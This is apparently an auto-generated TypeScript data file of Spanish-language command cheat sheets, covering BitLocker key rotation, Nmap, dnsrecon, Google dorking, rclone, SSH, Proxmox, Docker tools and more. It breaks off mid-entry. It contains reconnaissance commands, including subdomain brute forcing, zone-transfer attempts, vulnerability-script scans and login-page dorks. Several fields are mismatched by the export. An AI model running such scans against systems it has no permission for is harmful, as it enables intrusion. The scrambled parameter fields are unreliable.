// Este archivo es generado automáticamente desde Notion
// NO editar manualmente - los cambios se sobrescribirán

export interface Command {
  id: string;
  title: string;
  command: string;
  description: string;
  category: string;
  tags: string[];
  examples?: string[];
  dangerous?: boolean;
  platform?: string;
  syntax?: string;
  parameters?: Array<{
    param: string;
    description: string;
    example: string;
  }>;
  output?: string;
  notes?: string;
  references?: string[];
  created_at: string;
  updated_at: string;
}

export const commands: Command[] = [
  {
    "id": "318ec7e7-4fc0-81de-ba9c-e3467b0948b8",
    "title": "BitLocker Self-Custody",
    "command": "manage-bde -protectors -enable C: -RecoveryPassword",
    "description": "Protocolo para gestionar claves de recuperación de BitLocker localmente, eliminando la dependencia de Microsoft/nube y rotando la clave para invalidar copias previas.",
    "category": "Cifrado",
    "tags": [],
    "examples": [
      "### **📌 Descripción breve**\n\n> Protocolo para sacar la Recovery Key de BitLocker de la nube de Microsoft, guardarla offline y rotarla para invalidar cualquier copia previa. Aplica cuando se usa cuenta Microsoft en Windows 10/11.\n\n---\n\n\n### **🛠 Sintaxis básica**",
      "---\n\n\n### **⚙️ Parámetros clave**\n\n\n| Fase               | Acción                                                | Comando                                                                                                |\n| ------------------ | ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |\n| 1 — Respaldar      | Anotar clave actual en papel/USB offline              | `manage-bde -protectors -get C:`                                                                       |\n| 2 — Borrar de nube | Eliminar entradas en portal Microsoft                 | [https://account.microsoft.com/devices/recoverykey](https://account.microsoft.com/devices/recoverykey) |\n| 3 — Rotar clave    | Generar nueva Recovery Key (nunca ha tocado internet) | `manage-bde -protectors -disable C:` luego `-enable C: -RecoveryPassword`                              |\n| 4 — Verificar      | Confirmar que el ID y clave cambiaron                 | `manage-bde -protectors -get C:`                                                                       |\n\n\n---\n\n\n### **🚀 Ejemplos de uso**\n\n\n**Fase 1 — Respaldar clave actual:**",
      "**Fase 2 — Eliminar de la nube de Microsoft:**",
      "**Fase 3 — Rotar la clave:**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "### **📌 Descripción breve**\n\n> Protocolo para sacar la Recovery Key de BitLocker de la nube de Microsoft, guardarla offline y rotarla para invalidar cualquier copia previa. Aplica cuando se usa cuenta Microsoft en Windows 10/11.\n\n---\n\n\n### **🛠 Sintaxis básica**",
    "parameters": [
      {
        "param": "manage-bde -protectors -get C:",
        "description": "| 2 — Borrar de nube",
        "example": "Eliminar entradas en portal Microsoft"
      }
    ],
    "output": "---\n\n\n### **📤 Salida esperada**",
    "notes": "- La **Recovery Key** (48 dígitos) es la que Microsoft sube automáticamente si se usa cuenta MS. La **VMK** nunca sale del chip TPM.\n- Una clave que tocó un medio no confiable se considera comprometida (OpSec). Rotar = cambiar la cerradura.\n- NUNCA guardar la Recovery Key en archivo de texto en el mismo equipo cifrado.\n- Bajo **CLOUD Act**, Microsoft está obligado a entregar datos bajo orden judicial válida.\n- Para deshabilitar el envío automático: `gpedit.msc` → Configuración de equipo → Plantillas administrativas → Componentes de Windows → BitLocker Drive Encryption.",
    "references": [
      "Portal de claves Microsoft",
      "Documentación manage-bde"
    ],
    "created_at": "2026-03-03T03:27:00.000Z",
    "updated_at": "2026-03-05T03:17:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-8150-ae48-ff6f365e922b",
    "title": "Browserless — Chrome Headless en Docker",
    "command": "docker run -p 3000:3000 ",
    "description": "API Docker que levanta un Chrome sin interfaz para scraping de páginas con JavaScript dinámico, screenshots y PDFs.",
    "category": "Config",
    "tags": [],
    "examples": [
      "docker run -p 3000:3000 ghcr.io/browserless/chromium",
      "---\n\n\n### **⚙️ Endpoints principales**\n\n\n| Endpoint         | Descripción                                |\n| ---------------- | ------------------------------------------ |\n| `/screenshot`    | Captura PNG/JPEG de una URL                |\n| `/pdf`           | Genera PDF de una URL                      |\n| `/content`       | Devuelve el HTML renderizado (post-JS)     |\n| `/scrape`        | Extrae elementos del DOM por selector CSS  |\n| `ws://host:3000` | WebSocket para Puppeteer/Playwright remoto |\n\n\n---\n\n\n### **🚀 Ejemplos de uso**\n\n\n**Screenshot de una URL:**",
      "**Extraer contenido HTML renderizado:**",
      "**Scrape por selector CSS:**",
      "**Puppeteer remoto (Node.js):**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "docker run -p 3000:3000 ghcr.io/browserless/chromium",
    "parameters": [
      {
        "param": "/screenshot",
        "description": "Captura PNG/JPEG de una URL",
        "example": "| `/pdf`"
      },
      {
        "param": "/content",
        "description": "Devuelve el HTML renderizado (post-JS)",
        "example": "| `/scrape`"
      }
    ],
    "output": "",
    "notes": "- n8n no interpreta JavaScript por sí solo: para scraping de SPAs o páginas con JS, Browserless es el complemento estándar.\n- Usar en la misma red Docker que n8n y llamarlo por nombre de servicio.\n- `CONCURRENT=5` limita sesiones simultáneas para proteger la RAM del servidor.\n- Alternativa: **Playwright** directo en contenedor propio si se necesita mayor control.",
    "references": [
      "Browserless docs",
      "GitHub"
    ],
    "created_at": "2026-03-05T00:21:00.000Z",
    "updated_at": "2026-03-05T03:17:00.000Z"
  },
  {
    "id": "24fec7e7-4fc0-80ef-a008-f3585a1afc4e",
    "title": "Dnsrecon",
    "command": "dnsrecon -d ejemplo.com -t std",
    "description": "Herramienta para enumerar registros DNS y realizar descubrimiento de subdominios.",
    "category": "Escan",
    "tags": [],
    "examples": [
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon [opciones]",
      "dnsrecon -d ejemplo.com -t std",
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon -d ejemplo.com -t axfr"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
    "parameters": [
      {
        "param": "-d",
        "description": "Dominio objetivo",
        "example": "`-d ejemplo.com`"
      },
      {
        "param": "-t",
        "description": "Tipo de enumeración (`std`, `brt`, `axfr`, `goo`)",
        "example": "`-t brt`"
      },
      {
        "param": "-D",
        "description": "Diccionario de subdominios",
        "example": "`-D subdomains.txt`"
      },
      {
        "param": "--lifetime",
        "description": "Timeout de consulta",
        "example": "`--lifetime 5`"
      }
    ],
    "output": "",
    "notes": "- El tipo `std` obtiene registros básicos (A, AAAA, MX, NS, TXT).\n- Usar `t goo` para buscar subdominios indexados en Google.\n- Con diccionarios grandes, limitar el tiempo de consulta con `-lifetime`.",
    "references": [
      "Repositorio oficial",
      "Documentación"
    ],
    "created_at": "2025-08-14T20:53:00.000Z",
    "updated_at": "2025-12-28T22:13:00.000Z"
  },
  {
    "id": "28aec7e7-4fc0-8080-b36c-c6da57b219e3",
    "title": "Google Dorking",
    "command": "dnsrecon -d ejemplo.com -t std",
    "description": "Realizar busquedas avanzadas con filtros en google.",
    "category": "OSINT",
    "tags": [],
    "examples": [
      "\"incident report\" filetype:pdf site:av-test.org",
      "\"Busqueda\" > Coincidencia exacta de la frase\nsite:site.com > Busqueda unicamente en el dominio seleccionado.",
      "intitle:\"index of\" \"login\" site:example.com\nBrute force de subdominios con diccionario:"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "\"incident report\" filetype:pdf site:av-test.org",
    "parameters": [],
    "output": "",
    "notes": "- **Legal/ético:** úsalo solo en activos propios o con permiso.\n- **Reduce ruido:** combina `site:` + `filetype:` + una frase exacta entre comillas.",
    "references": [],
    "created_at": "2025-10-12T22:59:00.000Z",
    "updated_at": "2026-03-05T02:58:00.000Z"
  },
  {
    "id": "253ec7e7-4fc0-80e2-bdb9-e54621c69807",
    "title": "Ls ",
    "command": "ls -la /home/usuario/documentos",
    "description": " listar archivos y directorios",
    "category": "Linux",
    "tags": [],
    "examples": [
      "ls -la /home/usuario/documentos"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "ls -la /home/usuario/documentos",
    "parameters": [
      {
        "param": "-l",
        "description": "Formato largo (permisos, propietario, tamaño)",
        "example": "`ls -l`"
      },
      {
        "param": "-a",
        "description": "Mostrar archivos ocultos (incluye . y ..)",
        "example": "`ls -a`"
      },
      {
        "param": "-h",
        "description": "Tamaños legibles para humanos (KB, MB, GB)",
        "example": "`ls -lh`"
      },
      {
        "param": "-t",
        "description": "Ordenar por fecha de modificación",
        "example": "`ls -lt`"
      },
      {
        "param": "-r",
        "description": "Orden reverso",
        "example": "`ls -lr`"
      },
      {
        "param": "-R",
        "description": "Listado recursivo",
        "example": "`ls -R`"
      }
    ],
    "output": "ls\n    ```\n\n- **Listado detallado con archivos ocultos:**\n\n    ```bash\n    ls -la\n    ```\n\n- **Listado con tamaños legibles ordenado por fecha:**\n\n    ```bash\n    ls -lht\n    ```\n\n- **Listado recursivo de subdirectorios:**\n\n    ```bash\n    ls -R /var/log\n    ```\n\n\n**📤 Salida esperada**",
    "notes": "",
    "references": [
      "Manual de ls",
      "Guía de comandos Linux"
    ],
    "created_at": "2025-08-18T01:16:00.000Z",
    "updated_at": "2026-03-05T01:27:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-814a-8ec4-f0a2aa33f5f8",
    "title": "MEGAcmd",
    "command": "mega-sync /home/usuario/MEGA_local /",
    "description": "Cliente CLI oficial de MEGA para Linux que permite sincronizar carpetas, subir/bajar archivos y montar la nube como WebDAV.",
    "category": "Linux",
    "tags": [],
    "examples": [
      "# Instalar en Kali/Debian 12\nwget https://mega.nz/linux/repo/Debian_12/amd64/megacmd-Debian_12_amd64.deb\nsudo apt install ./megacmd-Debian_12_amd64.deb\n\n# Login seguro (modo interactivo)\nmega-cmd\n# > login tu_email@gmail.com\n# > exit\n\n# Sincronizar carpeta local con MEGA\nmkdir -p ~/MEGA_local\nmega-sync ~/MEGA_local /",
      "mega-<comando> [opciones] [argumentos]",
      "mega-login email@gmail.com TuContraseña\nhistory -c   # borrar contraseña del historial",
      "# En cada máquina:\nmkdir -p ~/MEGA_CTF\nmega-sync ~/MEGA_CTF /HTB\n# Los archivos se sincronizan automáticamente entre todas"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Instalar en Kali/Debian 12\nwget https://mega.nz/linux/repo/Debian_12/amd64/megacmd-Debian_12_amd64.deb\nsudo apt install ./megacmd-Debian_12_amd64.deb\n\n# Login seguro (modo interactivo)\nmega-cmd\n# > login tu_email@gmail.com\n# > exit\n\n# Sincronizar carpeta local con MEGA\nmkdir -p ~/MEGA_local\nmega-sync ~/MEGA_local /",
    "parameters": [
      {
        "param": "mega-login",
        "description": "Iniciar sesión",
        "example": "`mega-login email pass`"
      },
      {
        "param": "mega-sync",
        "description": "Sincronizar carpeta local ↔ cloud",
        "example": "`mega-sync ~/local /remoto`"
      },
      {
        "param": "mega-get",
        "description": "Descargar archivo puntual",
        "example": "`mega-get /ruta/archivo.py .`"
      },
      {
        "param": "mega-put",
        "description": "Subir archivo",
        "example": "`mega-put local.txt /ruta/`"
      },
      {
        "param": "mega-ls",
        "description": "Listar archivos en la nube",
        "example": "`mega-ls /HTB`"
      },
      {
        "param": "mega-webdav",
        "description": "Montar como WebDAV local",
        "example": "`mega-webdav /`"
      },
      {
        "param": "mega-sync",
        "description": "Ver sincronizaciones activas",
        "example": "`mega-sync` (sin args)"
      }
    ],
    "output": "---\n\n\n### **📤 Salida esperada**",
    "notes": "- El archivo `.megaignore` se sincroniza como cualquier archivo — editándolo en un equipo se propaga a todos\n- `mega-webdav` permite montar MEGA como unidad local accesible desde cualquier app",
    "references": [
      "MEGAcmd GitHub",
      "Descargas Linux"
    ],
    "created_at": "2026-03-05T00:59:00.000Z",
    "updated_at": "2026-03-05T03:13:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-810d-8d97-d27ce6499494",
    "title": "Mermaid.js",
    "command": "",
    "description": "Lenguaje de diagramas basado en texto para documentar arquitecturas e infraestructuras en Markdown y Obsidian.",
    "category": "Config",
    "tags": [],
    "examples": [
      "### **📌 Descripción breve**\n\n> Mermaid.js genera diagramas de flujo, secuencia y arquitectura desde texto plano. Funciona nativamente en Obsidian, GitHub, GitLab y Notion.\n\n---\n\n\n### **🛠 Sintaxis básica**",
      "---\n\n\n### **⚙️ Tipos de nodo**\n\n\n| Sintaxis    | Forma      | Uso típico            |\n| ----------- | ---------- | --------------------- |\n| `[Texto]`   | Rectángulo | Servicio / componente |\n| `{{Texto}}` | Rombo      | Firewall / decisión   |\n| `(Texto)`   | Redondeado | Usuario / endpoint    |\n| `((Texto))` | Círculo    | Nodo central          |\n| `[(Texto)]` | Cilindro   | Base de datos         |\n\n\n---\n\n\n### **🚀 Tipos de conexión**",
      "---\n\n\n### **🎨 Estilos y clases**",
      "---\n\n\n### **📤 Subgraphs (agrupar zonas)**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "### **📌 Descripción breve**\n\n> Mermaid.js genera diagramas de flujo, secuencia y arquitectura desde texto plano. Funciona nativamente en Obsidian, GitHub, GitLab y Notion.\n\n---\n\n\n### **🛠 Sintaxis básica**",
    "parameters": [
      {
        "param": "[Texto]",
        "description": "Rectángulo",
        "example": "Servicio / componente"
      },
      {
        "param": "{{Texto}}",
        "description": "Rombo",
        "example": "Firewall / decisión"
      },
      {
        "param": "(Texto)",
        "description": "Redondeado",
        "example": "Usuario / endpoint"
      },
      {
        "param": "((Texto))",
        "description": "Círculo",
        "example": "Nodo central"
      },
      {
        "param": "[(Texto)]",
        "description": "Cilindro",
        "example": "Base de datos"
      }
    ],
    "output": "",
    "notes": "- En Obsidian: usa bloque  mermaid   — renderiza automáticamente\n- En GitHub/GitLab: mismo bloque, soporte nativo desde 2022\n- `graph TD` = top-down; `graph LR` = left-right; `graph RL` = derecha a izquierda\n- Para diagramas de secuencia usar `sequenceDiagram` en lugar de `graph`\n- Editor online: [mermaid.live](http://mermaid.live/)",
    "references": [
      "Mermaid.js Docs",
      "Mermaid Live Editor"
    ],
    "created_at": "2026-03-05T00:54:00.000Z",
    "updated_at": "2026-03-05T03:15:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-814f-9f6e-c4fcb7329944",
    "title": "Nmap",
    "command": "nmap -sC -sV -oN scan.txt <target>",
    "description": "Escáner de red open source para descubrimiento de hosts, puertos abiertos y detección de servicios/OS.",
    "category": "Escan",
    "tags": [],
    "examples": [
      "nmap -sC -sV -oN scan.txt 192.168.1.0/24",
      "nmap [opciones] <target>\n# target puede ser IP, rango CIDR, hostname o archivo",
      "nmap -sC -sV -oN initial.txt <target>",
      "nmap -p- -sC -sV -oN full.txt <target>",
      "sudo nmap -sU -sC -sV --top-ports 200 -oN udp.txt <target>",
      "nmap --script vuln -oN vuln.txt <target>",
      "nmap -sn 192.168.1.0/24   # ping sweep — solo descubre hosts"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "nmap -sC -sV -oN scan.txt 192.168.1.0/24",
    "parameters": [
      {
        "param": "-sC",
        "description": "Scripts NSE por defecto",
        "example": "`nmap -sC <target>`"
      },
      {
        "param": "-sV",
        "description": "Detecta versión de servicios",
        "example": "`nmap -sV <target>`"
      },
      {
        "param": "-sS",
        "description": "SYN scan (stealth, requiere root)",
        "example": "`sudo nmap -sS <target>`"
      },
      {
        "param": "-sU",
        "description": "Escaneo UDP",
        "example": "`sudo nmap -sU <target>`"
      },
      {
        "param": "-p-",
        "description": "Escanear todos los 65535 puertos",
        "example": "`nmap -p- <target>`"
      },
      {
        "param": "-p",
        "description": "Puertos específicos o rango",
        "example": "`nmap -p 22,80,443 <target>`"
      },
      {
        "param": "-O",
        "description": "Detección de OS (requiere root)",
        "example": "`sudo nmap -O <target>`"
      },
      {
        "param": "-A",
        "description": "Aggressive: OS + versión + scripts + traceroute",
        "example": "`nmap -A <target>`"
      },
      {
        "param": "-oN",
        "description": "Output en formato normal",
        "example": "`nmap -oN out.txt <target>`"
      },
      {
        "param": "-oG",
        "description": "Output grepable",
        "example": "`nmap -oG out.gnmap <target>`"
      },
      {
        "param": "--script",
        "description": "Ejecutar script NSE específico",
        "example": "`nmap --script vuln <target>`"
      },
      {
        "param": "-T4",
        "description": "Velocidad agresiva (0=lento, 5=máximo)",
        "example": "`nmap -T4 <target>`"
      },
      {
        "param": "-Pn",
        "description": "Sin ping — asume host activo",
        "example": "`nmap -Pn <target>`"
      },
      {
        "param": "-n",
        "description": "Sin resolución DNS",
        "example": "`nmap -n <target>`"
      }
    ],
    "output": "",
    "notes": "- **Siempre usar Nmap en Linux** — Windows limita Raw Sockets (incluso con Npcap). Los escaneos `-sS` y `-O` fallan o son inestables en Windows.\n- `/24` = tu red doméstica (256 IPs). Evita `/4` o rangos amplios sin permiso — escanear millones de IPs es ilegal.\n- Combina `-p-` con `-T4` para rapidez: `nmap -p- -T4 -sC -sV <target>`\n- Para CTF: primero `nmap -p-` para descubrir todos los puertos, luego `-sC -sV` solo en los abiertos.\n- Output `-oA nombre` genera los 3 formatos a la vez (.nmap, .gnmap, .xml)",
    "references": [
      "Documentación oficial",
      "NSE Scripts"
    ],
    "created_at": "2026-03-05T01:39:00.000Z",
    "updated_at": "2026-03-05T03:11:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-81d6-bfa7-d94a824219d8",
    "title": "OnionShare",
    "command": "https://onionshare.org",
    "description": "Herramienta para transferir archivos de forma anónima creando un servidor .onion temporal sin cuentas ni registros.",
    "category": "Config",
    "tags": [],
    "examples": [
      "# En Windows/Mac/Linux:\n# 1. Abrir OnionShare → arrastrar archivo\n# 2. Copiar dirección .onion generada\n# 3. En Tor Browser: pegar la dirección .onion → descargar\n# 4. Cerrar OnionShare → servidor desaparece",
      "# Flujo completo\nEmisor: OnionShare → arrastrar archivo → copiar URL .onion\nReceptor: Tor Browser → pegar URL .onion → descargar",
      "# En Windows: abrir OnionShare → arrastrar el archivo\n# OnionShare genera: http://ejemplo123abc.onion/descarga\n# En Whonix Workstation → Tor Browser → pegar URL",
      "# OnionShare → modo \"Receive\" → compartir URL .onion con emisor"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# En Windows/Mac/Linux:\n# 1. Abrir OnionShare → arrastrar archivo\n# 2. Copiar dirección .onion generada\n# 3. En Tor Browser: pegar la dirección .onion → descargar\n# 4. Cerrar OnionShare → servidor desaparece",
    "parameters": [],
    "output": "",
    "notes": "- El servidor .onion es E2EE: el tráfico nunca sale a internet abierto",
    "references": [
      "OnionShare oficial",
      "Documentación"
    ],
    "created_at": "2026-03-05T01:02:00.000Z",
    "updated_at": "2026-03-05T03:12:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-817c-b377-f1dd9c6db3a6",
    "title": "Proxmox VE",
    "command": "ssh root@<proxmox-ip>",
    "description": "Hipervisor tipo 1 open source que combina KVM (VMs completas) y LXC (contenedores ligeros) con gestión centralizada vía web.",
    "category": "Config",
    "tags": [],
    "examples": [
      "ssh root@192.168.137.10\n# Acceso web: https://192.168.137.10:8006",
      "# Listar VMs y contenedores\nqm list           # VMs KVM\npct list          # Contenedores LXC\n\n# Iniciar / detener\nqm start <vmid>\nqm stop <vmid>\npct start <ctid>\npct stop <ctid>\n\n# Crear snapshot\nqm snapshot <vmid> <nombre>\n\n# Ver logs del sistema\njournalctl -u pve-cluster",
      "# Seleccionar el NVMe secundario durante el instalador\n# El instalador puede modificar la EFI — usar discos físicamente separados",
      "# Editar /etc/systemd/logind.conf\nHandleLidSwitch=ignore\nHandleLidSwitchDocked=ignore\nsystemctl restart systemd-logind",
      "qemu-img convert -f vmdk -O qcow2 imagen.vmdk imagen.qcow2\nqm importdisk <vmid> imagen.qcow2 local-lvm"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "ssh root@192.168.137.10\n# Acceso web: https://192.168.137.10:8006",
    "parameters": [
      {
        "param": "/etc/systemd/logind.conf",
        "description": "Evitar suspensión al cerrar tapa",
        "example": "`HandleLidSwitch=ignore`"
      }
    ],
    "output": "",
    "notes": "- **Tipo 1 vs Tipo 2**: Proxmox corre directo sobre hardware (800MB overhead). VMware Workstation pasa por el OS host (4GB+ overhead).\n- KSM fusiona páginas de RAM idénticas entre VMs — muy útil cuando varias VMs usan el mismo OS base.\n- Panel web disponible en `https://<IP>:8006`",
    "references": [
      "Documentación oficial Proxmox"
    ],
    "created_at": "2026-03-05T01:40:00.000Z",
    "updated_at": "2026-03-05T03:09:00.000Z"
  },
  {
    "id": "288ec7e7-4fc0-80b3-81ca-f99965597cc9",
    "title": "Rclone",
    "command": "rclone sync \"source\"   \"Destino\\\"   -P ",
    "description": "Como usar Rclone",
    "category": "Config",
    "tags": [],
    "examples": [
      "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
      "rclone [comando] [origen] [destino] [opciones]",
      "rclone sync ./MisFotos gdrive:/Fotos --progress --dry-run",
      "rclone mount gdrive:/ ~/GDrive",
      "rclone sync ./Documentos gdrive:/Backup/Documentos -P --delete-after",
      "rclone copy ./notas gdrive:/pdfs --include \"*.pdf\" -P",
      "rclone sync \"C:\\OBS\" \"P:\\OBS\" -P --exclude \"*.tmp\" --exclude \"*.bak\""
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
    "parameters": [
      {
        "param": "-listremotes",
        "description": "Lista las particones remotas",
        "example": "rclone listremotes"
      },
      {
        "param": "-config delete ''",
        "description": "Elimina el directorio deseado",
        "example": "|"
      },
      {
        "param": "--dry-run",
        "description": "Muestra un apreview sobre el comando a ejecutar.",
        "example": "rcloud   -comand —dry-run"
      },
      {
        "param": "--update",
        "description": "Actualiza solo lo mas reciente",
        "example": "rclone —command —update"
      }
    ],
    "output": "",
    "notes": "- Antes de sincronizar, **usa** **`--dry-run`** para evitar errores fatales.\n- **Programar backups automáticos** con `cron`\n- Rclone puede cifrar tus datos con `rclone config` → tipo `crypt7`",
    "references": [
      "Documentación"
    ],
    "created_at": "2025-10-10T01:31:00.000Z",
    "updated_at": "2026-03-05T03:02:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-81d8-b2fc-dbf96fa45b2a",
    "title": "SSH Config File",
    "command": "ssh mi-servidor",
    "description": "Archivo ~/.ssh/config para definir alias de servidores y evitar especificar rutas y usuarios manualmente.",
    "category": "Linux",
    "tags": [],
    "examples": [
      "# ~/.ssh/config\nHost mi-servidor-aws\n    HostName 12.34.56.78\n    User ubuntu\n    IdentityFile ~/.ssh/mi-clave-aws.pem\n\nHost proxmox-lab\n    HostName 192.168.137.100\n    User root\n    IdentityFile ~/.ssh/id_ed25519",
      "Host <alias>\n    HostName <IP o dominio>\n    User <usuario>\n    IdentityFile <ruta-a-clave-privada>\n    Port <puerto>          # opcional, default 22",
      "ssh mi-servidor-aws\n# equivale a: ssh -i ~/.ssh/mi-clave-aws.pem ubuntu@12.34.56.78",
      "echo -e \"\\nHost nuevo\\n    HostName 1.2.3.4\\n    User debian\\n    IdentityFile ~/.ssh/id_ed25519\" >> ~/.ssh/config",
      "chmod 600 ~/.ssh/config"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# ~/.ssh/config\nHost mi-servidor-aws\n    HostName 12.34.56.78\n    User ubuntu\n    IdentityFile ~/.ssh/mi-clave-aws.pem\n\nHost proxmox-lab\n    HostName 192.168.137.100\n    User root\n    IdentityFile ~/.ssh/id_ed25519",
    "parameters": [
      {
        "param": "Host",
        "description": "Alias que usarás en el comando `ssh`",
        "example": "`Host prod-server`"
      },
      {
        "param": "HostName",
        "description": "IP o dominio real del servidor",
        "example": "`HostName 10.0.0.5`"
      },
      {
        "param": "User",
        "description": "Usuario de login",
        "example": "`User ubuntu`"
      },
      {
        "param": "IdentityFile",
        "description": "Ruta a la clave privada",
        "example": "`IdentityFile ~/.ssh/key.pem`"
      },
      {
        "param": "Port",
        "description": "Puerto SSH (si no es 22)",
        "example": "`Port 2222`"
      }
    ],
    "output": "",
    "notes": "- El archivo `config` también debe tener permisos `600`\n- Usar `Host *` al final del archivo para definir defaults globales\n- `ProxyJump` permite saltar por un bastión: `ProxyJump bastion-host`\n- Compatible con `scp` y `rsync` — también usan el archivo config",
    "references": [
      "ssh_config man page"
    ],
    "created_at": "2026-03-05T00:53:00.000Z",
    "updated_at": "2026-03-05T03:16:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-8193-858e-ca335cb7756d",
    "title": "SSH Key Management",
    "command": "chmod 700 ~/.ssh && chmod 600 ~/.ssh/clave-privada",
    "description": "Organizar claves SSH en ~/.ssh/ con los permisos correctos para evitar errores de autenticación.",
    "category": "Linux",
    "tags": [],
    "examples": [
      "mkdir -p ~/.ssh\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/mi-clave-privada\nchmod 644 ~/.ssh/mi-clave-publica.pub",
      "ssh -i ~/.ssh/nombre-clave.pem usuario@<IP>",
      "mv ~/Downloads/mi-clave ~/.ssh/\nchmod 600 ~/.ssh/mi-clave",
      "ssh -i ~/.ssh/mi-clave-aws.pem ubuntu@<IP>",
      "ssh usuario@<IP>",
      "aws ec2 delete-key-pair --key-name NombreDeTuClave\nrm ~/.ssh/clave-vieja.pem"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "mkdir -p ~/.ssh\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/mi-clave-privada\nchmod 644 ~/.ssh/mi-clave-publica.pub",
    "parameters": [
      {
        "param": "chmod 700 ~/.ssh",
        "description": "| Clave privada",
        "example": "`600` (solo lectura del dueño)"
      }
    ],
    "output": "",
    "notes": "- Las claves con nombre estándar (`id_rsa`, `id_ed25519`) se usan automáticamente sin `-i`\n- Borrar un Key Pair en AWS solo elimina su registro — las instancias en ejecución conservan acceso\n- Para revocar acceso real a un servidor activo: eliminar la línea en `~/.ssh/authorized_keys` del servidor\n- En Windows: `%USERPROFILE%\\.ssh\\` es la ruta equivalente",
    "references": [
      "OpenSSH Manual",
      "AWS EC2 Key Pairs"
    ],
    "created_at": "2026-03-05T00:53:00.000Z",
    "updated_at": "2026-03-05T03:15:00.000Z"
  },
  {
    "id": "289ec7e7-4fc0-805d-b274-f6e0f779ad51",
    "title": "Venv",
    "command": "python -m venv /path/to/new/virtual/environment",
    "description": "Como usar Virtual Envirronments ",
    "category": "Config",
    "tags": [],
    "examples": [
      "# Windows / Linux / macOS\npython -m venv .venv",
      "# Windows (PowerShell)\n.venv\\Scripts\\Activate.ps1\n\n# Windows (CMD)\n.venv\\Scripts\\activate.bat\n\n# Linux / macOS (bash/zsh)\nsource .venv/bin/activate",
      "deactivate",
      "python -m pip install -U pip\npip install requests\npip freeze > requirements.txt\npip install -r requirements.txt",
      "# Linux / macOS\nrm -rf .venv\n\n# Windows (PowerShell)\nRemove-Item -Recurse -Force .venv"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Windows / Linux / macOS\npython -m venv .venv",
    "parameters": [],
    "output": "",
    "notes": "- Usa el nombre `.venv` por convención y agrégalo a tu `.gitignore`.\n- Si PowerShell bloquea scripts, ejecuta (temporalmente):\n\n    ```powershell\n    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n    ```\n\n- Confirma que estás en el venv:\n\n    ```bash\n    which python  # Linux/macOS\n    where python  # Windows\n    ```",
    "references": [
      "https://docs.python.org/3/library/venv.html"
    ],
    "created_at": "2025-10-11T19:21:00.000Z",
    "updated_at": "2026-03-05T03:05:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-814c-a5f4-e42e85525278",
    "title": "Watchtower — Auto-update Docker",
    "command": "docker run -d --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower",
    "description": "Contenedor que monitoriza y actualiza automáticamente otros contenedores Docker cuando hay nuevas imágenes disponibles.",
    "category": "Config",
    "tags": [],
    "examples": [
      "docker run -d \\\n  --name watchtower \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  containrrr/watchtower --interval 86400",
      "---\n\n\n### **⚙️ Parámetros clave**\n\n\n| Flag                | Descripción                                                                        | Ejemplo                  |\n| ------------------- | ---------------------------------------------------------------------------------- | ------------------------ |\n| `--interval <s>`    | Segundos entre cada chequeo                                                        | `--interval 86400` (24h) |\n| `--cleanup`         | Elimina imágenes antiguas tras actualizar                                          | `--cleanup`              |\n| `--monitor-only`    | Solo notifica, no actualiza                                                        | `--monitor-only`         |\n| `--include-stopped` | Incluye contenedores detenidos                                                     | `--include-stopped`      |\n| `--label-enable`    | Solo actualiza contenedores con label `com.centurylinklabs.watchtower.enable=true` | `--label-enable`         |\n\n\n---\n\n\n### **🚀 Ejemplos de uso**\n\n\n**Actualizar solo contenedores etiquetados:**",
      "**Notificación por email al actualizar:**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "docker run -d \\\n  --name watchtower \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  containrrr/watchtower --interval 86400",
    "parameters": [
      {
        "param": "--interval <s>",
        "description": "Segundos entre cada chequeo",
        "example": "`--interval 86400` (24h)"
      },
      {
        "param": "--cleanup",
        "description": "Elimina imágenes antiguas tras actualizar",
        "example": "`--cleanup`"
      },
      {
        "param": "--monitor-only",
        "description": "Solo notifica, no actualiza",
        "example": "`--monitor-only`"
      },
      {
        "param": "--include-stopped",
        "description": "Incluye contenedores detenidos",
        "example": "`--include-stopped`"
      },
      {
        "param": "--label-enable",
        "description": "Solo actualiza contenedores con label `com.centurylinklabs.watchtower.enable=true`",
        "example": "`--label-enable`"
      }
    ],
    "output": "---\n\n\n### **📤 Salida esperada**",
    "notes": "- Montar `/var/run/docker.sock` le da acceso total al daemon de Docker: **no exponer en contenedores públicos**.\n- En producción crítica usar `--monitor-only` + pipeline CI/CD para actualizaciones controladas.\n- Combinar con `--cleanup` evita que el disco se llene de imágenes antiguas.",
    "references": [
      "Watchtower docs",
      "Docker Hub"
    ],
    "created_at": "2026-03-05T00:21:00.000Z",
